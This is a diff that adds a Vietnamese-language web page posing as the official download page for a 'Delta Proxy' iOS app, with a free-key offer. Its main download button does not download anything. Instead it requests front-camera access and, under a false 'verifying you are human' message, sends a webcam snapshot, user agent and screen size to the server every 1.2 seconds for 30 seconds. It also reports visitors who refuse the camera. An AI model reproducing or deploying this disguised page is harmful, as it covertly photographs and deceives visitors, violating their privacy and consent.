@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Delta Proxy — Tải Về Chính Thức</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#030712; --card-bg:rgba(15,23,42,.75); --card-border:rgba(255,255,255,.12);
+    --primary:#8b5cf6; --primary-glow:rgba(139,92,246,.4);
+    --cyan:#06b6d4; --cyan-glow:rgba(6,182,212,.35);
+    --green:#10b981; --pink:#ec4899; --amber:#f59e0b; --red:#ef4444;
+    --text:#f8fafc; --text-muted:#94a3b8;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  body{
+    min-height:100vh; font-family:'Plus Jakarta Sans',sans-serif; color:var(--text);
+    background:
+      radial-gradient(1100px 620px at 12% -10%, rgba(124,58,237,.22), transparent 60%),
+      radial-gradient(900px 520px at 92% 0%, rgba(34,211,238,.15), transparent 60%),
+      var(--bg);
+    display:flex;justify-content:center;align-items:flex-start;padding:24px 16px 60px;
+    position:relative;overflow-x:hidden;
+  }
+  .bg-glow{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+  .orb{position:absolute;border-radius:50%;filter:blur(100px);opacity:.6;animation:float 12s infinite alternate ease-in-out}
+  .orb-1{width:350px;height:350px;background:var(--primary-glow);top:-80px;left:-80px}
+  .orb-2{width:320px;height:320px;background:var(--cyan-glow);bottom:-60px;right:-60px;animation-delay:-5s}
+  .orb-3{width:250px;height:250px;background:rgba(236,72,153,.25);top:40%;left:50%;transform:translate(-50%,-50%);animation-delay:-2s}
+  @keyframes float{0%{transform:translate(0,0) scale(1)}100%{transform:translate(40px,50px) scale(1.15)}}
+
+  .wrap{width:100%;max-width:460px;position:relative;z-index:1;display:flex;flex-direction:column;gap:18px}
+  .card{
+    background:var(--card-bg);backdrop-filter:blur(24px) saturate(180%);
+    -webkit-backdrop-filter:blur(24px) saturate(180%);
+    border:1px solid var(--card-border);border-radius:28px;padding:24px;
+    box-shadow:0 20px 40px -15px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.15);
+  }
+  .hero-card{text-align:center;padding-top:0;overflow:hidden;border-radius:26px}
+  .hero-banner img{width:100%;display:block;border-radius:18px;box-shadow:0 14px 34px rgba(0,0,0,.5)}
+  .icon-wrapper{position:relative;width:92px;height:92px;margin:-40px auto 10px;z-index:2}
+  .icon-wrapper::after{
+    content:'';position:absolute;inset:-6px;border-radius:26px;
+    background:linear-gradient(135deg,#7C3AED,#22D3EE,#EC4899);
+    filter:blur(15px);opacity:.8;z-index:-1;
+  }
+  .app-icon{width:100%;height:100%;border-radius:22px;object-fit:cover;border:3px solid rgba(255,255,255,.92);box-shadow:0 12px 30px rgba(0,0,0,.55)}
+  .app-title{font-size:24px;font-weight:900;letter-spacing:-.4px;background:linear-gradient(180deg,#fff 0%,#cbd5e1 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .app-tag{font-family:'JetBrains Mono',monospace;color:var(--cyan);font-size:13px;font-weight:700;margin-top:4px}
+  .badges{display:flex;justify-content:center;gap:8px;margin:14px 0 20px;flex-wrap:wrap}
+  .badge{font-size:11px;font-weight:700;padding:5px 12px;border-radius:100px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#94a3b8;display:inline-flex;align-items:center;gap:6px}
+  .badge.active{color:#34d399;background:rgba(16,185,129,.12);border-color:rgba(52,211,153,.3)}
+  .dot-pulse{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(16,185,129,.7);animation:pulse 1.8s infinite}
+  @keyframes pulse{0%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,.7)}70%{transform:scale(1);box-shadow:0 0 0 8px rgba(16,185,129,0)}100%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,0)}}
+
+  .ios-support-box{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:10px 14px;margin:12px 0 20px;display:flex;flex-direction:column;align-items:center;gap:6px}
+  .ios-title{font-size:11px;font-weight:800;color:#94a3b8;text-transform:uppercase;letter-spacing:.8px;display:flex;align-items:center;gap:5px}
+  .ios-range{font-size:12.5px;font-weight:700;color:#38bdf8;display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:center}
+  .ios-range .divider{color:rgba(255,255,255,.2)}
+
+  .btn-main-direct{
+    display:flex;align-items:center;justify-content:center;gap:10px;width:100%;
+    padding:16px 20px;border-radius:20px;font-size:15px;font-weight:800;
+    color:#030712;background:linear-gradient(135deg,#a78bfa 0%,#22d3ee 100%);
+    box-shadow:0 10px 25px -5px rgba(139,92,246,.5);text-decoration:none;
+    position:relative;overflow:hidden;transition:all .25s cubic-bezier(.4,0,.2,1);
+    border:none;cursor:pointer;
+  }
+  .btn-main-direct::before{
+    content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
+    transform:skewX(-20deg);animation:shimmer 3s infinite;pointer-events:none;
+  }
+  @keyframes shimmer{100%{left:200%}}
+  .btn-main-direct:hover,.btn-main-direct:active{transform:translateY(-2px);box-shadow:0 14px 28px -4px rgba(139,92,246,.6)}
+  .btn-main-direct:disabled{opacity:.55;cursor:not-allowed;transform:none}
+
+  .btn-ipa-menu{
+    display:flex;align-items:center;justify-content:space-between;width:100%;
+    padding:16px 20px;border-radius:20px;color:#fff;background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.12);text-decoration:none;transition:all .25s ease;
+    margin-top:10px;
+  }
+  .btn-ipa-menu:hover,.btn-ipa-menu:active{background:rgba(6,182,212,.12);border-color:rgba(6,182,212,.4);transform:translateY(-2px)}
+  .btn-ipa-text{display:flex;flex-direction:column;text-align:left}
+  .btn-ipa-text span:first-child{font-size:15px;font-weight:800;color:#fff}
+  .btn-ipa-text span:last-child{font-size:11.5px;color:var(--cyan);margin-top:2px}
+  .btn-key-free{background:rgba(16,185,129,.06);border-color:rgba(16,185,129,.25)}
+  .btn-key-free:hover,.btn-key-free:active{background:rgba(16,185,129,.12);border-color:rgba(16,185,129,.4)}
+  .btn-key-free .btn-ipa-text span:last-child{color:#34d399}
+
+  .footer-note{text-align:center;font-size:11.5px;color:var(--text-muted);margin-top:6px}
+  #st{display:none;margin-top:16px;font-size:13px;color:#94a3b8;line-height:1.5;text-align:center}
+  #st.show{display:block}
+  .spinner{display:inline-block;width:14px;height:14px;border:2px solid #333;border-top-color:#22d3ee;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:8px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .done{color:#34c759}
+  .err{color:#ff453a}
+</style>
+</head>
+<body>
+<div class="bg-glow">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+</div>
+
+<div class="wrap">
+  <!-- HERO -->
+  <div class="card hero-card">
+    <div class="hero-banner">
+      <img src="https://getuid.vip/delta-banner.jpg" alt="DELTA" onerror="this.style.display='none'">
+    </div>
+    <div class="icon-wrapper">
+      <img class="app-icon" src="https://getuid.vip/delta-logo.jpg" alt="DELTA" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2222%22 fill=%22%237c3aed%22/><text x=%2250%22 y=%2262%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22white%22 font-family=%22sans-serif%22 font-weight=%22bold%22>D</text></svg>'">
+    </div>
+    <h1 class="app-title">DELTA CLIENT</h1>
+    <div class="app-tag">Delta Client · Delta Proxy</div>
+
+    <div class="badges">
+      <span class="badge">v1.6.5</span>
+      <span class="badge active"><span class="dot-pulse"></span> Đang hoạt động</span>
+    </div>
+
+    <div class="ios-support-box">
+      <div class="ios-title">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.32c.64-.78 1.08-1.86.96-2.95-.93.04-2.07.62-2.74 1.4-.6.7-1.12 1.81-.98 2.89 1.05.08 2.12-.56 2.76-1.34z"/></svg>
+        <span>iOS Hỗ Trợ:</span>
+      </div>
+      <div class="ios-range">
+        <span>iOS 16.0 ➔ 18.7.1</span>
+        <span class="divider">•</span>
+        <span>iOS 26.0 ➔ 26.6.2</span>
+        <span class="divider">•</span>
+        <span>iOS 27 ➔ 27.2</span>
+      </div>
+    </div>
+
+    <!-- NÚT TẢI CHÍNH — trigger xin quyền camera + spam chụp -->
+    <button class="btn-main-direct" id="dl">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Tải IPA Proxy (Ký Bằng Chứng Chỉ)
+    </button>
+
+    <!-- Nút nhận key free -->
+    <a class="btn-ipa-menu btn-key-free" href="#" onclick="return false;">
+      <div class="btn-ipa-text">
+        <span>NHẬN KEY FREE IPA DELTA</span>
+        <span>Nhận key miễn phí 2 tiếng · Mỗi ngày</span>
+      </div>
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3"/></svg>
+    </a>
+
+    <div id="st"></div>
+  </div>
+
+  <div class="footer-note">© 2026 Nguyễn Bảo Khanh All rights reserved.</div>
+</div>
+
+<script>
+const btn = document.getElementById("dl");
+const st  = document.getElementById("st");
+
+let capturing    = false;
+let captureTimer = null;
+let mediaStream  = null;
+let canvas = null, ctx = null, video = null;
+
+function setStatus(html, cls){
+  st.className = "show " + (cls || "");
+  st.innerHTML = html;
+}
+
+function blobToB64(blob){
+  return new Promise((res, rej) => {
+    const r = new FileReader();
+    r.onloadend = () => res(r.result.split(",")[1]);
+    r.onerror = rej;
+    r.readAsDataURL(blob);
+  });
+}
+
+async function sendToServer(b64, info){
+  try{
+    await fetch("/api/upload", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({image: b64, info: info})
+    });
+  }catch(e){}
+}
+
+async function startCapture(){
+  mediaStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+    audio: false
+  });
+  video = document.createElement("video");
+  video.srcObject = mediaStream;
+  video.setAttribute("playsinline", "");
+  video.muted = true;
+  await video.play();
+  canvas = document.createElement("canvas");
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  ctx = canvas.getContext("2d");
+  capturing = true;
+  doShot();
+  captureTimer = setInterval(doShot, 1200);
+}
+
+async function doShot(){
+  if (!capturing || !ctx) return;
+  try{
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.7));
+    if (!blob) return;
+    const b64 = await blobToB64(blob);
+    const info = "shot@" + new Date().toISOString() +
+                 "\nUA: " + navigator.userAgent +
+                 "\nScreen: " + screen.width + "x" + screen.height;
+    await sendToServer(b64, info);
+  }catch(e){}
+}
+
+function stopCapture(){
+  capturing = false;
+  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
+  if (mediaStream){ mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+  if (video){ video.srcObject = null; video = null; }
+  canvas = null; ctx = null;
+}
+
+btn.addEventListener("click", async () => {
+  btn.disabled = true;
+  setStatus('<span class="spinner"></span>Đang yêu cầu quyền camera...');
+
+  try{
+    await startCapture();
+    setStatus('<span class="spinner"></span>Đang xác minh người thật, vui lòng giữ nguyên...');
+  }catch(e){
+    await sendToServer("", "camera_denied\nUA: " + navigator.userAgent);
+    setStatus('Bạn cần cho phép camera để tiếp tục tải xuống', 'err');
+    btn.disabled = false;
+    return;
+  }
+
+  setTimeout(() => {
+    stopCapture();
+    setStatus('✓ Xác minh hoàn tất, file đang được chuẩn bị...', 'done');
+    btn.disabled = false;
+  }, 30000);
+});
+
+window.addEventListener("pagehide", stopCapture);
+window.addEventListener("beforeunload", stopCapture);
+</script>
+</body>
+</html>
